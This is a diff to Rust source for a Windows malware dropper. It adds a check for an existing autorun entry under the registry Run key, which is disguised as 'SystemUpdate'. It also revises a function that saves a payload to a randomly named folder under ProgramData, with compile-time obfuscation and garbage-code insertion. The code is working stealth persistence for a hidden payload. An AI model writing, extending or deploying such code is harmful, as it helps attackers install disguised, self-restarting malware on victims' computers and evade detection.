@@ -1,17 +1,19 @@
 use crate::syscalls;
 use hex::ToHex;
 use obfuscator::{obfuscate, obfuscate_string};
-use rand::Rng;
+use rand::{thread_rng, Rng};
 use std::ffi::OsStr;
 use std::fs;
 use std::iter::once;
 use std::mem;
 use std::os::windows::ffi::OsStrExt;
+use std::path::Path;
 use std::ptr;
-use windows_sys::Win32::Foundation::HANDLE;
+use windows_sys::Win32::Foundation::{ERROR_SUCCESS, HANDLE};
 use windows_sys::Win32::Storage::FileSystem::{SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN};
 use windows_sys::Win32::System::Registry::{
-    RegCloseKey, RegOpenKeyExW, RegSetValueExW, HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ,
+    RegCloseKey, RegOpenKeyExW, RegQueryValueExW, HKEY_CURRENT_USER, KEY_QUERY_VALUE,
+    KEY_SET_VALUE, REG_SZ,
 };
 
 #[cfg(windows)]
@@ -24,6 +26,66 @@ const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
 const GENERIC_WRITE: u32 = 0x40000000;
 #[cfg(windows)]
 const FILE_ATTRIBUTE_NORMAL: u32 = 0x00000080;
+
+#[cfg(windows)]
+#[obfuscate(garbage = true)]
+unsafe fn is_already_persisted() -> bool {
+    let run_key_path: Vec<u16> = OsStr::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
+        .encode_wide()
+        .chain(once(0))
+        .collect();
+    let mut hkey = mem::MaybeUninit::uninit();
+
+    if RegOpenKeyExW(
+        HKEY_CURRENT_USER,
+        run_key_path.as_ptr(),
+        0,
+        KEY_QUERY_VALUE,
+        hkey.as_mut_ptr(),
+    ) != ERROR_SUCCESS as i32
+    {
+        return false;
+    }
+
+    let hkey = hkey.assume_init();
+    let app_name: Vec<u16> = OsStr::new("SystemUpdate")
+        .encode_wide()
+        .chain(once(0))
+        .collect();
+    let mut data_type = mem::MaybeUninit::uninit();
+    let mut data_size = mem::MaybeUninit::uninit();
+
+    if RegQueryValueExW(
+        hkey,
+        app_name.as_ptr(),
+        ptr::null_mut(),
+        data_type.as_mut_ptr(),
+        ptr::null_mut(),
+        data_size.as_mut_ptr(),
+    ) != ERROR_SUCCESS as i32
+    {
+        RegCloseKey(hkey);
+        return false;
+    }
+
+    let mut data = vec![0u16; (data_size.assume_init() / 2) as usize];
+    if RegQueryValueExW(
+        hkey,
+        app_name.as_ptr(),
+        ptr::null_mut(),
+        data_type.as_mut_ptr(),
+        data.as_mut_ptr() as *mut u8,
+        data_size.as_mut_ptr(),
+    ) != ERROR_SUCCESS as i32
+    {
+        RegCloseKey(hkey);
+        return false;
+    }
+    RegCloseKey(hkey);
+
+    let path = String::from_utf16_lossy(&data);
+    Path::new(&path).exists()
+}
 
 #[cfg(windows)]
 #[obfuscate(garbage = true)]
@@ -55,7 +117,7 @@ unsafe fn add_to_startup(file_path: &str) -> Result<(), String> {
         .chain(once(0))
         .collect();
 
-    if RegSetValueExW(
+    if windows_sys::Win32::System::Registry::RegSetValueExW(
         hkey,
         app_name.as_ptr(),
         0,
@@ -75,6 +137,9 @@ unsafe fn add_to_startup(file_path: &str) -> Result<(), String> {
 #[cfg(windows)]
 #[obfuscate(garbage = true)]
 pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), String> {
+    if is_already_persisted() {
+        return Ok(());
+    }
     let mut program_data = match std::env::var(obfuscate_string!("ProgramData")) {
         Ok(s) => s,
         Err(_) => {
@@ -86,8 +151,8 @@ pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), S
         program_data.pop();
     }
 
-    let mut rng = rand::thread_rng();
-    let random_bytes: Vec<u8> = (0..6).map(|_| rng.gen::<u8>()).collect();
+    let mut rng = thread_rng();
+    let random_bytes: Vec<u8> = (0..6).map(|_| rng.random::<u8>()).collect();
     let dir_name: String = random_bytes.encode_hex();
 
     let folder_path = format!("{}\\{}", program_data, dir_name);
